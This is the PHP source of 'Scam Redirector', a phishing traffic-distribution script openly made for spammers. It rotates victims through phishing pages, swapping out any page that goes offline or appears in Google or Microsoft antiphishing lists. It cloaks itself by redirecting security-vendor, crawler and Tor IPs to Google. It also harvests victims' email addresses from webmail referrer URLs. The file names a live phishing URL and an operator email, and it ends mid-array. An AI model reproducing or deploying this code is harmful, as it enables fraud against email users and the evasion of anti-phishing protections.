<?php
/*************************************************************************************
** Scam Redirector v0.1 with IP banning system and more...							**
** Last Modified: July 20, 2009													**
** Made by: SSS (Smart Spamming Solutions) from Romania								**
** --- Getting Spam To A Higher Level ---											**
**																					**
** Contact: ssslocalhost[at]gmail.com												**
** <$$$>If you make $$$ with my script, please donate a few to me also :-)</$$$>	**
**																					**
** Features:																		**
** - Auto-change scam website if is offline or in Google's phish database			**
** - Advanced IP & Word (UA & Referrer) banning system, including Tor network		**
** - Logging system with anti-log poisoning through UA or Referrer					**
** - Sends an email when you are running out of scams								**
*************************************************************************************/
//http://www.botsvsbrowsers.com/ip/166.137.133.178/index.html
//https://wiki.mozilla.org/Phishing_Protection:_Server_Spec#Lookup_Requests
//Do not show PHP errors
error_reporting(0); //Leave as-is (recommended), otherwise put // in front of error_reporting(0);

/*************
** Settings **
**************/
//Scam Redirector version
define("VERSION", "v0.1-July 20, 2009");

//Log file, where the visitor data should be written
define("LOG_FILE", "ip.html");

//------------ TESTING or PRODUCTION
define('STAGE', 'PRODUCTION');

//Add Google Analytics, for advanced Spam Statistics :-)
$google_analytics = 0; // 1 - True; 0 - False

//Use the IP banning system
$ip_ban = 1; // 1 - True; 0 - False

//Ban Tor network IPs
$ban_tor = 1; // 1 - True; 0 - False

//Use the word banning system
$word_ban = 1; // 1 - True; 0 - False

//Send email, if you are running out of scams
$send_email = 1; // 1 - True; 0 - False

//Where to send an email, if you are running out of scams ($send_email must be set to 1)
define("EMAIL", "vreaulei5@gmail.com"); //Change this with your own email

//Where to redirect the banned visitor
define("REDIRECT_TO", "http://www.google.com/"); //Leave as-is (recommended)

//Check the scam against Google's antiphish database (used in Firefox)
//For better spam results set it to 1, but is not recommended since you will run out of scams in a matter of hours!
define("GOOG_ANTIPHISH", 1); // 1 - True; 0 - False

//Check the scam against Microsoft's antiphish database (used in Internet Explorer)
//For better spam results set it to 1, but is not recommended since you will run out of scams in a matter of hours!
$msft_antiphish = 1; // 1 - True; 0 - False


	if (STAGE == 'TESTING')
	{
		//Define the path of the scam
		define("PATH", "");
		
		//Define scam pages
	    $scams = array('http://127.0.0.1/redirect/isonline.php', 'http://127.0.0.1/redirect/isonline2.php',
					   'http://127.0.0.1/redirect/isonline3.php', 'http://127.0.0.1/redirect/isonline4.php',
					   'http://127.0.0.1/redirect/isonline5.php');
	} elseif (STAGE == 'PRODUCTION')
	{
		//Define the path of the scam
		define("PATH", "index.html");
	
		//Define scam pages
   		$scams = array('http://www.artunlimited.com/skin/amx/amx/amx/');
	}

define("FRH_TOTAL", count($scams));
define("FRH_ONLINE", "Coming Soon");
define("FRH_OFFLINE", "Coming Soon");

$file = $_SERVER['PHP_SELF'];
define("INDEX", $file);

define("EMAILSFILE", "emails.txt");

if ($_GET)
{
	SSSCommands();
}

InitStats();

$detect_os = strtoupper($_SERVER["SERVER_SOFTWARE"]);
$pos = strpos($detect_os, "WIN32");
if ($pos === false) {
      $current_os = "NON_WINDOWS";
} else {
      $current_os = "WINDOWS";
}

//Get the visitor IP
if (@getenv(HTTP_CLIENT_IP))
{
    $ip = @getenv(HTTP_CLIENT_IP);
} else
{
    $ip = @getenv(REMOTE_ADDR);
}

//Get hostname by IP
$hostname = gethostbyaddr($ip);

//Get date & time of the visit
$dt = date("Y-m-d h:i:s A");

//Get visitor's User Agent
$agent = htmlspecialchars($_SERVER['HTTP_USER_AGENT']);

//Get visitor's referrer
if (isset($_SERVER['HTTP_REFERER']))
{
    $referrer = strtolower(htmlspecialchars($_SERVER['HTTP_REFERER']));
} else
    $referrer = "";

//Function to get the webmail name
function MailFromReferrer($referrer)
{
    //Define the patterns
    $wp = array('mail.yahoo.', 'mail.live.com', 'webmail.aol.com', 'mail.aol.com',
        '.earthlink.net', 'mail.lycos.com', 'mail.google.com', 'mail.excite.it',
        '.libero.it', '.alice.it', 'mail.comcast.net', 'webmail.att.net', 'mail.rcn.',
        '.mail.com', 'webmail.canada.com', '.verizon.net', 'commcenter.mchsi.com',
		'.juno.com', 'newmail.core.com', 'webmail.peoplepc.com', '.netaddress.com',
		'.bigpond.com', '.orange.co.uk', '.rr.com', '.roadrunner.com', 'www.me.com',
		'.netzero.net', 'tiscali.co.uk', '.maktoob.com', '.netscape.com', '.rock.com',
		'.operamail.com', 'www.google.com/ig/gmailmax', '.secureserver.net', '.coxmail.com', '.cox.net',
		'.fuse.net', '.inbox.com', '.ntlworld.com', '.alltel.net', '.email.it',
		'.nhlmail.com', '.alloymail.com', '.tiscali.it', '.dada.it', '.graffiti.net',
		'.handbag.com', '.freenet.de', '.bluewin.ch', '.arcor.de', '.strato.de',
		'.unitybox.de', '.eim.ae', 'mynet.com', 'oi.com.br', '.abv.bg', '.1und1.de', '.perfora.net',
 '.abacho.de', '.yandex.ru', '.networld.at', '.rediffmail.com', '.mail.ru', 'mail.bg', '.edumail.at', '.verizonmail.com',
 '.guam.net', '.northnet.org', '.easilymail.co.uk', '.knology.net', '.startlogic.com', '.katamail.com', '.tele2internet.it',
 '.interfree.it', '.tim.it', '.jumpy.it', '.gmxattachments.net', '.fastwebnet.it', '.ilink.ro', '.zappmobile.ro', '.connex.ro',
 '.freemail.hu', '.rediffmailpro.com', '.mayl.de', '.tre.it', '.cheapnet.it', '.ipower.com', '.aruba.it', '.gmx.net', '.tele2.it',
 '.register.it', '.univision.com', '.charter.net', '.doteasy.com', '.utanet.at', '.alicebusiness.it', '.walla.co.il', '.fastmail.fm',
 '.unofree.it', '.simail.it', '.netcentrum.cz', 'webmail.frontier.com');

    //Define de webmail name
    $wm = array('Yahoo! Mail', 'Hotmail', 'AOL', 'AOL', 'Earthlink', 'Lycos', 'Gmail',
        'Excite IT', 'Libero IT', 'Alice IT', 'Comcast', 'AT&T', 'RCN', 'Mail', 'Canada',
        'Verizon', 'Mediacom', 'Juno', 'CoreComm', 'PeoplePC', 'Net@ddress',
		'BigPond', 'Orange', 'Road Runner', 'Road Runner', 'MobileMe', 'NetZero', 'Tiscali UK',
		'Maktoob', 'Netscape', 'Rock.com', 'OperaMail', 'Gmail', 'secureserver.net', 'Cox', 'Cox',
		'Fuse', 'Inbox.com', 'Virgin Media', 'Windstream', 'Email.it', 'Mail', 'Mail', 'Tiscali IT',
		'Data.it', 'Graffiti.net', 'Handbag.com', 'freenet.de', 'bluewin.ch', 'Arcor', 'Strato.de',
		'Unitymedia Mail', 'Etisalat', 'MYNET', 'Oi Brasil', 'Abv.bg', '1&amp;1 Webmail', '1&amp;1 Webmail',
 'Abacho.de', 'Yandex', 'Networld Mail', 'Rediffmail', 'Mail.ru', 'Mail.bg', 'edumail.at', 'Verizon', 'Guam.net',
 'Westelcom', 'EasilyMail', 'Knology', 'StartLogic', 'Katamail', 'TELE2 IT', 'Interfree', 'TIM', 'Mediaset.it',
 'GMX', 'FASTWEB', 'iLink', 'Zapp Mobile', 'Connex', 'freemail.hu', 'Rediffmail Pro', 'MAYL.DE', 'Tre', 'Cheapnet',
 'WEB.DE', 'IPOWER Webmail', 'Aruba Webmail', 'GMX', 'TELE2 IT', 'Register.it Webmail', 'Univision.com',
 'Charter.net', 'Doteasy Webmail', 'TELE2 AT', 'Alice', 'Walla.co.il', 'FastMail', 'Uno Communications SpA', 'Simail.it', 'NetCentrum', 'Frontier');

    //Define type
    $wt = array('inbox', 'bulk', 'spam', 'junk', 'trash');

    if (!empty($referrer))
    {
        for ($i = 0; $i <= count($wp) - 1; $i++)
        {
            $pos = strpos($referrer, $wp[$i]);
            if ($pos === false)
            {
                //
            } else
            {
                $pos1 = strpos($referrer, 'inbox');
                if ($pos1 === false)
                {

                    $pos2 = strpos($referrer, 'bulk');
                    if ($pos2 === false)
                    {
                        //

                        $pos3 = strpos($referrer, 'spam');
                        if ($pos3 === false)
                        {
                            $referrer = $wm[$i];
                        } else
                        {
                            $referrer = $wm[$i] . " - SPAM";
                        }

                    } else
                    {
                        $referrer = $wm[$i] . " - BULK";
                    }


                } else
                {
                    $referrer = $wm[$i] . " - INBOX";
                }
            }


        }
    }
    return $referrer;
}

//Function to check if the IP is in our mask
function compareRange($ip, $mask, $remaining)
{
    $ip = explode('.', $ip);
    $mask = explode('.', $mask);
    for ($i = 0; $i < sizeof($ip); $i++)
    {
        $m = $i < sizeof($mask) ? $mask[$i] : $remaining;
        if ($ip[$i] < $m)
            return - 1;
        if ($ip[$i] > $m)
            return 1;
    }
    return 0;
}

//Function to check if the IP is banned
function checkIP($ip_to_match, $ip_array)
{
    if (is_array($ip_array))
    {
        foreach ($ip_array as $filter)
        {
            if (strpos($filter, '-') === false)
                $limits = array($filter, $filter);
            else
                $limits = explode('-', $filter);
            if (compareRange($ip_to_match, $limits[0], 0) >= 0 && compareRange($ip_to_match,
                $limits[1], 255) <= 0)
                return true;
        }
    }
    return false;
}

//Function to check if the IP is banned
function GetIPOwner($ip_to_match, $ip_array, $owner_array)
{
    if (is_array($ip_array))
    {
		$i = -1;
        foreach ($ip_array as $filter)
        {
			$i++;
            if (strpos($filter, '-') === false)
                $limits = array($filter, $filter);
            else
                $limits = explode('-', $filter);
            if (compareRange($ip_to_match, $limits[0], 0) >= 0 && compareRange($ip_to_match,
                $limits[1], 255) <= 0){
				if 	($owner_array[$i] == '') return 'Not found'; else
                return $owner_array[$i];
				}
        }
    }
    return 'Not found';
}

function counter()
{
    if (!file_exists('counter.txt'))
    {
        $fh = fopen('counter.txt', 'a');
        fwrite($fh, "0\n");
        fclose($fh);
    }
    $fh = fopen('counter.txt', 'r+');
    $data = fread($fh, 512);
    $count = $data + 1;
    fseek($fh, 0);
    fwrite($fh, $count . "\n");
    fclose($fh);
    return $count;
}

/**
* Function get_between
* 
* @param	str		IP Address
* @return	Boolean value representing whether or not the visitor should been banned
*/
function get_between($text, $s1, $s2) {
    $mid_url = "";
    $pos_s = strpos($text,$s1);
    $pos_e = strpos($text,$s2);
    for ( $i=$pos_s+strlen($s1) ; ( ( $i < ($pos_e)) && $i < strlen($text) ) ; $i++ ) {
        $mid_url .= $text[$i];
    }
    return $mid_url;
}

/**
* Function checkOnTheFlyBan check if the IP Address is in our On The Fly list with banned IPs
*
* @param	str		IP Address
* @return	Boolean value representing whether or not the visitor should been banned
*/
function checkOnTheFlyBan($ip)
{
	$url = "ip_ban.txt";
	$lines = array_map('rtrim',file($url));
	foreach ($lines as $line_num => $line)
	{
     	if ($ip == $line)
		{
			 return true;
		}
	}
	return false;
}

//Function to check if the IP is a Tor node
function checkTorNode($ip)
{
	//Tor nodes from https://www.dan.me.uk/torlist/
	$url = "tor.txt"; // https://www.dan.me.uk/torlist/
	$lines = array_map('rtrim',file($url));
	foreach ($lines as $line_num => $line)
	{
     	if ($ip == $line)
		{
			 return true;
		}
	}
	return false;
}

//Function to check if the word from referrer or UA is banned
function checkWord($str, $bw)
{
    if (!empty($str))
    {
        $str = strtolower($str);
        for ($i = 0; $i <= count($bw) - 1; $i++)
        {
            $pos = strpos($str, $bw[$i]);
            if ($pos === false)
            {
                $bool = false;
            } else
            {
                $bool = true;
                break;
            }
        }
    } else
    {
        $bool = false;
    }
    return $bool;
}

/**
* Function SSSCommands is used to display internal pages of Scam Redirector
*/
function SSSCommands()
{
	define("TITLE", "[S]cam [R]edirector");
	/**
	* Function ShowMenu is used to display Scam Redirector's menu
	*/
	function ShowMenu()
	{
		echo '<center>';
		echo '<br /><br />[ <a href="'.LOG_FILE.'" target="_blank">View IP Log</a> ] | [ <a href="ip_ban.txt" target="_blank">View On-The-Fly IP List</a> ] | [ <a href="'.EMAILSFILE.'" target="_blank">View On-The-Fly Email List</a> ]';
		echo "<br />[ <a href=".INDEX."?about>About</a> ] | [ <a href=".INDEX."?check>Check</a> ] | [ <a href=".INDEX."?empty>Empty</a> ] | [ <a href=".INDEX."?help>Help</a> ] | [ <a href=".INDEX."?info target=_blank>Info</a> ] | [ <a href=".INDEX."?settings>Settings</a> ] | [ <a href=".INDEX."?stats>Statistics</a> ] | [ <a href=".INDEX."?ver>Version</a> ] | [ <a href=".INDEX."?verify>Verify</a> ]";
		echo '<br /><br />Copyright (c) 2009, <b>[S]</b>mart <b>[S]</b>pamming <b>[S]</b>olutions. All Rights Reserved.';
		echo '</center>';
	}

	/**
	* Function Percent is used to calculate the percentage based on two inputs
	*/
    function Percent($num, $total, $p = false){
        $per = round($num / $total * 100, 2);
            if($p == true){
                $per .= "%";
            }
        return $per;    
    }

if (isset($_GET['about']))
{
	echo '<html><head><title>'.TITLE.' - About</title></head><body><center>';
	echo "About <b>[S]</b>cam <b>[R]</b>edirector";
	echo "<br /><br />";
	echo "Version ".VERSION;
	echo "<br /><br />";
	echo "Made in Romania";
	echo "<br /><br />";
	echo "--- Getting Spam To A Higher Level ---";
	echo "<br /><br />";
	echo "<$$$>If you make $$$ with my script, please donate a few to me also :-)<&#47;$$$>";
	echo "<br /><br />ssslocalhost[at]gmail[dot]com";
	echo '</center>';
	ShowMenu();
	echo '</body></html>';
}

if (isset($_GET['check']))
{
	echo '<html><head><title>'.TITLE.' - Check</title></head><body><center>';

$func = array("mail", "file_get_contents");

for ($i=0;$i<count($func);$i++) {
	if(!function_exists($func[$i])) {
		echo "<font color=red>$func[$i] is not available. You cannot install <b>Scam Redirector</b> on this server.</font><br/>";
	} else {
		echo "<font color=green>$func[$i] is available. You can install <b>Scam Redirector</b> on this server.</font><br/>";
	}
}
	echo '</center>';
	ShowMenu();
	echo '</body></html>';
}

//Piece of code used to clean-up the log file (Usage: index.php?empty)
if (isset($_GET['empty']))
{
	echo '<html><head><title>'.TITLE.' - Empty</title></head><body><center>';
	echo '<a href="'.INDEX.'?empty1">Clean '.LOG_FILE.'</a><br /><a href="'.INDEX.'?empty2">Clean '.LOG_FILE.' &amp; reset counter &amp; statistics</a>';
	echo '</center>';
	ShowMenu();
	echo '</body></html>';
}

//Piece of code used to clean-up the log file (Usage: index.php?empty)
if (isset($_GET['empty1']))
{
	//Reset counter
	$fh = fopen(LOG_FILE, "w");
	fwrite($fh, "");
	fclose($fh);
	
	echo '<html><head><title>'.TITLE.' - Empty</title></head><body><center>';
	echo "The log file <b>".LOG_FILE."</b> has been cleaned.";
	echo '</center>';
	ShowMenu();
	echo '</body></html>';
}

//Piece of code used to clean-up the log file (Usage: index.php?empty)
if (isset($_GET['empty2']))
{
	//Reset counter
	$fh = fopen(LOG_FILE, "w");
	fwrite($fh, "");
	fclose($fh);
	
	echo '<html><head><title>'.TITLE.' - Empty</title></head><body><center>';
	echo "The log file <b>".LOG_FILE."</b> has been cleaned.";
	
		$fh = fopen('counter.txt', 'w');
		fwrite($fh, "0\n");
		fclose($fh);
		$fh = fopen('stats.txt', 'w');
		fwrite($fh, time().",0,0,0,0,0");
        fclose($fh);
		echo " The counter & statistics have been reset!";
	echo '</center>';
	ShowMenu();
	echo '</body></html>';
}

if (isset($_GET['help']))
{
	echo '<html><head><title>'.TITLE.' - Help</title></head><body>';
	echo "<b>[S]</b>cam <b>[R]</b>edirector Help";
	echo "<br /><br />";
	echo "<b>about</b> - Provides information about <b>[S]</b>cam <b>[R]</b>edirector";
	echo "<br /><br />";
	echo "<b>check</b> - Check if you can run <b>[S]</b>cam <b>[R]</b>edirector on this host.";
	echo "<br /><br />";
	echo "<b>empty</b> - Clears the log file.";
	echo "<br /><br />";
	echo "<b>help</b> - Provides Help information for <b>[S]</b>cam <b>[R]</b>edirector commands.";
	echo "<br /><br />";
	echo "<b>info</b> - Executes the phpinfo().";
	echo "<br /><br />";
	echo "<b>menu</b> - Displays the <b>[S]</b>cam <b>[R]</b>edirector menu.";
	echo "<br /><br />";
	echo "<b>stats</b> - Displays statistics about your spam and <b>[S]</b>cam <b>[R]</b>edirector.";
	echo "<br /><br />";
	echo "<b>ver</b> - Displays the <b>[S]</b>cam <b>[R]</b>edirector version.";
	echo "<br /><br />";
	echo "<b>verify</b> - Verify each scam and reports its status.";
	echo "<br /><br />";
	echo "Usage: <b>index.php?help</b>";
	ShowMenu();
	echo '</body></html>';
}

if (isset($_GET['info']))
{
	echo '<html><head><title>'.TITLE.' - Info (phpinfo)</title></head><body></body></html>';
	phpinfo();
}

if (isset($_GET['menu']))
{
	echo '<html><head><title>'.TITLE.' - Menu</title></head><body>';
	ShowMenu();
	echo '</body></html>';
}

if (isset($_GET['settings']))
{
	echo '<html><head><title>'.TITLE.' - Settings</title></head><body>';
	echo "<b>[S]</b>cam <b>[R]</b>edirector Settings";
	echo "<br /><br />";
	echo '<fieldset><legend>Settings</legend><table width="500" border="0">
  <tr>
    <td width="140"><b>Google Analytics</b></td>
    <td width="10">&nbsp;</td>
    <td width="253">
	<select name="ga">
	<option value="Yes">Yes</option>
	<option value="No" selected>No</option>
	</select>
	</td>
  </tr>
  <tr>
    <td><b>Send Email</b></td>
    <td>&nbsp;</td>
    <td><select name="send_email">
	<option value="Yes" selected>Yes</option>
	<option value="No">No</option>
	</select></td>
  </tr>
  <tr>
    <td><b>Email</b></td>
    <td>&nbsp;</td>
    <td><input type="text" name="email" size="30" value="'.EMAIL.'" /></td>
  </tr>
  <tr>
    <td><b>Redirect to</b></td>
    <td>&nbsp;</td>
    <td><input type="text" name="redirect_to" size="30" value="'.REDIRECT_TO.'" /></td>
  </tr>
  <tr>
    <td><b>Stage</b></td>
    <td>&nbsp;</td>
    <td>
	<select name="stage">';
	if (STAGE == 'TESTING'){
	echo '<option value="TESTING" selected>TESTING</option><option value="PRODUCTION">PRODUCTION</option>';
	} elseif (STAGE == 'PRODUCTION'){
	echo '<option value="TESTING">TESTING</option><option value="PRODUCTION" selected>PRODUCTION</option>';
	}
	echo '</select>
	</td>
  </tr>
  <tr>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td><input type="submit" name="submit" value="Save" /></td>
  </tr>
</table></fieldset>';
	echo '<fieldset><legend>Logging</legend><table width="500" border="0">
  <tr>
    <td width="140"><b>Log File</b></td>
    <td width="10">&nbsp;</td>
    <td width="253"><input type="text" name="log_file" value="'.LOG_FILE.'" /></td>
  </tr>
  <tr>
    <td><b>Log normal IPs</b></td>
    <td>&nbsp;</td>
    <td><select name="log1">
	<option value="Yes" selected>Yes</option>
	<option value="No">No</option>
	</select></td>
  </tr>
  <tr>
    <td><b>Log banned IPs</b></td>
    <td>&nbsp;</td>
    <td><select name="log2">
	<option value="Yes" selected>Yes</option>
	<option value="No">No</option>
	</select></td>
  </tr>
  <tr>
    <td><b>Log watched IPs</b></td>
    <td>&nbsp;</td>
    <td><select name="log3">
	<option value="Yes" selected>Yes</option>
	<option value="No">No</option>
	</select></td>
  </tr>
</table></fieldset>';
	echo '<fieldset><legend>Banning</legend><table width="500" border="0">
  <tr>
    <td width="140"><b>IP Banning</b></td>
    <td width="10">&nbsp;</td>
    <td width="253">
	<select name="ban1">
	<option value="Yes" selected>Yes</option>
	<option value="No">No</option>
	</select>
	</td>
  </tr>
  <tr>
    <td><b>Ban Tor Network</b></td>
    <td>&nbsp;</td>
    <td><select name="ban2">
	<option value="Yes" selected>Yes</option>
	<option value="No">No</option>
	</select></td>
  </tr>
  <tr>
    <td><b>Word Banning</b></td>
    <td>&nbsp;</td>
    <td><select name="ban2">
	<option value="Yes" selected>Yes</option>
	<option value="No">No</option>
	</select></td>
  </tr>
</table></fieldset>';
	echo '<fieldset><legend>Scams</legend><table width="500" border="0">
  <tr>
    <td width="140"><b>ScamPrint&trade;</b></td>
    <td width="10">&nbsp;</td>
    <td width="253"><input type="text" name="sp_1" size="40" value="&lt;ISONLINE VALUE=TRUE&gt;&lt;/ISONLINE&gt;" /></td>
  </tr>
  <tr>
    <td><b>Google Antiphish</b></td>
    <td>&nbsp;</td>
    <td><select name="goog">
	<option value="Yes" selected>Yes</option>
	<option value="No">No</option>
	</select></td>
  </tr>
  <tr>
    <td><b>Microsoft Antiphish</b></td>
    <td>&nbsp;</td>
    <td><select name="msft">
	<option value="Yes" selected>Yes</option>
	<option value="No">No</option>
	</select></td>
  </tr>
</table></fieldset>';
	ShowMenu();
	echo '</body></html>';
}

if (isset($_GET['stats']))
{
	$fh = fopen('stats.txt', 'r');
	$data = fread($fh, 1024);
	$array = explode(",", $data);
	fclose($fh);
	
	$otfip = 0;
	$otfemails = 0;
	
	if (file_exists('ip_ban.txt'))
	{
		$otfip = count(file('ip_ban.txt'));
	}
	if (file_exists(EMAILSFILE))
	{
		$otfemails = count(file(EMAILSFILE));
	}
	
	$vst = $array[1];
	$unq = $array[2];
	$bnd = $array[3];
	$per1 = Percent($bnd, $vst, true);
	$wat = $array[4];
	if ($wat == '')
	{
		$wat = 0;
	}
	$per2 = Percent($wat, $vst, true);
	$nor = $array[5];
	$per3 = Percent($nor, $vst, true);
	global $scams;
	$FRH_CURRENT = ScamURL($scams);
	
	$FRH_CURRENT_PARTS = parse_url($FRH_CURRENT);
	$FRH_URL = $FRH_CURRENT_PARTS['scheme']."://".$FRH_CURRENT_PARTS['host'];
	$frh_html = "";
	for ($i = 0; $i <= count($scams) - 1; $i++)
    {
		$frh_html .= "#{".($i+1)."} $scams[$i]<br />";
	}
	$frh_html = str_replace($FRH_URL, "<font color=red>$FRH_URL</font>", $frh_html);
	/*
	$key = array_search($FRH_CURRENT, $scams);
	$frh_online = FRH_TOTAL - $key;
	*/
	echo '<html><head><title>'.TITLE.' - Statistics</title><meta http-equiv="refresh" content="10" /></head><body>';
	echo "<b>[S]</b>cam <b>[R]</b>edirector Statistics";
	echo "<br /><br />";
	echo "Uptime: ".readable_time($array[0], 7);
	echo "<br /><br />";
	echo "Freehostia's: ".FRH_TOTAL."<br />".$frh_html."<br />Online: ".FRH_ONLINE."<br />Offline: ".FRH_OFFLINE;
	echo "<br /><br />";
	echo 'Visitors: <b><a href="'.LOG_FILE.'" target="_blank">'.$vst.'</a></b><br />Unique: <b>'.$unq.'</b><br />Banned: <b>'.$bnd.' ('.$per1.')</b><br />Watched: <b>'.$wat.' ('.$per2.')</b><br />Normal: <b>'.$nor.' ('.$per3.')</b>';
	echo "<br /><br />";
	echo 'On-The-Fly IPs: <b><a href="ip_ban.txt" target="_blank">'.$otfip.'</a></b><br />Emails: <b><a href="'.EMAILSFILE.'" target="_blank">'.$otfemails.'</a></b>';
	echo "<br /><br />";
	echo "Listed on Phishtank: <b>".GetPhishtank()."</b><br />Listed on Microsoft's phishing database: <b>No</b><br />Listed on Google's phishing database: <b>No</b>";
	ShowMenu();
	echo '</body></html>';
}

if (isset($_GET['ver']))
{
	echo '<html><head><title>'.TITLE.' - Version</title></head><body><center>';
	echo "You are running <b>[S]</b>cam <b>[R]</b>edirector ".VERSION.".";
	echo '</center>';
	ShowMenu();
	echo '</body></html>';
}

if (isset($_GET['verify']))
{
	echo '<html><head><title>'.TITLE.' - Verify</title></head><body><center>';
	echo "Coming Soon";
	echo '</center>';
	ShowMenu();
	echo '</body></html>';
}

die();
}

/**
* Function checkAsRedirect check if the referrer is the same with Scam Redirector URL. If true, 90% of the vistors should be banned
* 
* @param	referrer		Visitor's referrer
* @return	Boolean value representing whether or not the visitor should been banned
*/
function checkAsRedirect($referrer)
{
	//Check if server uses http or https
	$protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') ? 'https' : 'http';
	
	/*
	$_SERVER['SERVER_NAME'] does not work if UseCanonicalName is off. Used $_SERVER['HTTP_HOST'] instead
	*/
	$url_1 = $protocol."://".$_SERVER['HTTP_HOST'].substr(INDEX, 0, strrpos(INDEX, '/'));
	$url_2 = $protocol."://".$_SERVER['HTTP_HOST'].substr(INDEX, 0, strrpos(INDEX, '/'))."/";
	if (($referrer == $url_1) || ($referrer == $url_2))
	{
		return true;
	}
	return false;
}

/**
* Function RedirectURL check if the referrer is the same with Scam Redirector URL. If true, 90% of the vistors should be banned
*
* @param	referrer		Visitor's referrer
* @return	Boolean value representing whether or not the visitor should been banned
*/
function RedirectURL()
{
	//Check if server uses http or https
	$protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') ? 'https' : 'http';
	$url = $protocol."://".$_SERVER['HTTP_HOST'].substr(INDEX, 0, strrpos(INDEX, '/'));
	return $url;
}

/**
* Function checkMatch check if the string matches our banned string
* 
* @param	str		string
* @param	array	Array with banned strings
* @return	Boolean value representing whether or not the visitor should been banned
*/
function checkMatch($str, $array)
{
	for ($i = 0; $i <= count($array) - 1; $i++)
    {
		if ($str == $array[$i])
        {
			return true;
			break;
        }
	}
	return false;
}

/**
* Function checkUniqueIP
*
* @param	ip	IP Address
*/
function checkUniqueIP($ip)
{
	$lines = array_map('rtrim',file('ip.txt'));
	foreach ($lines as $line_num => $line)
	{
     	if ($ip == $line)
		{
			 return true;
		}
	}
	return false;
}

/**
* Function CheckDuplicate verifies the specified file for duplicate strings
* 
* @param	str		The string we want to check
* @param	file		The file where we will check for duplicate
* @return	Boolean value representing whether or not the visitor should been banned
*/
function CheckDuplicate($str, $file) {
 	if (file_exists($file))
	{
	$handle = fopen($file, "r");
	while(!@feof($handle))
	{
		$buffer .= @fgets($handle, 4096);
	}

	if (strstr($buffer,strtolower($str))) {
		return true;
	}
	}
	return false;
}

/**
* Function GetPhishtank will check if Scam Redirector was listed on Phishtank
* 
* @param	referrer		Referrer
* @param	ip		IP Address
* @return	Boolean value representing whether or not the visitor should been banned
*/
function GetPhishtank()
{
	$filename = 'phishtank.txt';
	if (file_exists($filename)) {

	$fh = fopen($filename, 'r');
	$data = fread($fh, 1024);
	fclose($fh);
	return $data;
	}else{
$fh = fopen($filename, 'w') or die("Can't open file");
fwrite($fh, 'No');
fclose($fh);
	return "No";
	}
}

/**
* Function GetEmail saves to (emails.txt) file the Email address from referrer, if found
* 
* @param	referrer		Referrer
* @param	ip		IP Address
* @return	Boolean value representing whether or not the visitor should been banned
*/
function GetEmail($referrer, $ip)
{
	if (!empty($referrer))
	{
		//Tiscali IT
		$pos = strpos($referrer, ".tiscali.it");
		if ($pos === false)
		{
			//
		} else
		{
			$domain = get_between($referrer, "?d=", "&amp;contentseed=");
			$user = get_between($referrer, "&amp;u=", "&amp;targetcontainer=");
			$email = $user."@".$domain;
		}
		//FASTWEB
		$pos = strpos($referrer, ".fastwebnet.it");
		if ($pos === false)
		{
			//
		} else
		{
			$domain = get_between($referrer, "?d=", "&amp;sh=");
			$user = get_between($referrer, "&amp;u=", "&amp;an=");
			$email = $user."@".$domain;
		}
		//Rediffmail Pro
		$pos = strpos($referrer, ".rediffmailpro.com");
		if ($pos === false)
		{
			//
		} else
		{
			$email = get_between($referrer, "&amp;login=", "&amp;session_id=");
		}
		
		//MAYL.DE
		$pos = strpos($referrer, ".mayl.de");
		if ($pos === false)
		{
			//
		} else
		{
			$email = get_between($referrer, "&amp;username=", "&amp;rfold=")."@mayl.de";
		}
		
		//handbag.com
		$pos = strpos($referrer, ".handbag.com");
		if ($pos === false)
		{
			//
		} else
		{
			$email = get_between($referrer, "&userid=", "&seq=");
			$email = str_replace("%40", "@", $email);
		}
		//Write to file
		if ((CheckDuplicate($str, EMAILSFILE) == FALSE) && ($email <> "") && ($email <> "@"))
		{
			$fh = fopen(EMAILSFILE, 'a');
			$str = "$ip - $email";
        	fwrite($fh, $str."\n");
        	fclose($fh);
		}
	}
}

/**
* Function InitStats creates the the settings file, used to provide statistics
*/
function InitStats()
{
if (!file_exists('stats.txt'))
	{
        $fh = fopen('stats.txt', 'a');
        fwrite($fh, time()."\n0\n0\n0\n10\n0\n");
        fclose($fh);
    }
}

/**
* Function checkMatch check if the string matches our banned string
* 
* @param	str		string
* @param	array	Array with banned strings
* @return	Boolean value representing whether or not the visitor should been banned
*/
function readable_time($timestamp, $num_times = 2) 
{ 
    //this returns human readable time when it was uploaded (array in seconds) 
    $times = array(31536000 => 'Year', 2592000 => 'Month',  604800 => 'Week', 86400 => 'Day', 3600 => 'Hour', 60 => 'Minute', 1 => 'Second'); 
    $now = time(); 

        /* Incorporates fix by Waylon */ 
        $secs = $now - $timestamp; 
        //Fix so that something is always displayed 
        if ($secs == 0) { 
               $secs = 1; 
        } 
        /* /Waylon */ 

    $count = 0; 
    $time = ''; 

    foreach ($times AS $key => $value) 
    { 
        if ($secs >= $key) 
        { 
            //time found 
            $s = ''; 
            $time .= floor($secs / $key); 

            if ((floor($secs / $key) != 1)) 
                $s = 's'; 

            $time .= ' ' . $value . $s; 
            $count++; 
            $secs = $secs % $key; 
            
            if ($count > $num_times - 1 || $secs == 0) 
                break; 
            else 
                $time .= ', '; 
        } 
    } 
    return $time; 
} 

//Array with banned IPs, also 127.0.0.1 because somehow the IP can pe spoofed
$ban_array = array('202.76.240-202.76.247', '195.234.136', '66.77.136', '66.16.13.0-66.16.13.63', '66.135.192-66.135.223', '193.28.178', '217.159.130.168-217.159.130.175', '216.113.160-216.113.191', '216.33.244-216.33.247', '216.33.236-216.33.243', '66.211.160-66.211.191', '217.168.153-217.168.156', '66.249.64-66.249.95', '67.195', '66.227.16.0-66.227.16.127', 
    '66.179.80.0-66.179.80.15', '209.147.112-209.147.127', '209.191.64-209.191.127', '64.111.96-64.111.127', '72.14.192.0-72.14.255.255', 
    '208.67.157.213', '193.147.160-193.147.179', '207.34.136.103', '62.149.226.208',
    '12.90.64.238', '84.99.95', '150.70', '198.23.5', '166.68.134', 
    '10.190.38.164', '75.125.130', '72.13.32-72.13.63', '128.232', '97.77.68.206',
    '220.97', '138.26', '38.98.19.111', '82.81', '144.214',
    '194.246.126-194.246.127', '77.124-77.127', '66.113.96-66.113.111',
    '203.5.112', '115.145', '124.180.239.165', '62.212.10.250',
	'159.149', '79.176-79.183', '62.67.240-62.67.241', '163.221', '91.121.64-91.121.143',
    '209.123.109.175', '209.123.192.187', '66.196.64-66.196.127', '208.109',
    '216.69.128-216.69.191', '72.244.219.54', '194.72.238', '192.76.82',
